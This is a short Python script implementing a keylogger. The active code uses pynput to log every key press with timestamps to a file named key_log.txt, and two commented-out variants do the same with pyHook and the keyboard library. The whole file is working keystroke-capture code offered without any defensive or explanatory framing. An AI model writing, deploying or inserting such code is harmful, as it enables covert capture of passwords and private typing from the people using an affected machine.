# import pyHook, pythoncom, sys, logging
# # feel free to set the file_log to a different file name/location

# file_log = 'keyloggeroutput.txt'

# def OnKeyboardEvent(event):
#     logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
#     chr(event.Ascii)
#     logging.log(10,chr(event.Ascii))
#     return True
# hooks_manager = pyHook.HookManager()
# hooks_manager.KeyDown = OnKeyboardEvent
# hooks_manager.HookKeyboard()
# pythoncom.PumpMessages()

# import keyboard
from pynput.keyboard import Key, Listener
import logging
log_dir = ''
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join() 
# log_file = 'keystrokes.txt'

# def on_key_press(event):
#     with open(log_file, 'a') as f:
#         f.write('{}\n'.format(event.name))

# keyboard.on_press(on_key_press)

# keyboard.wait()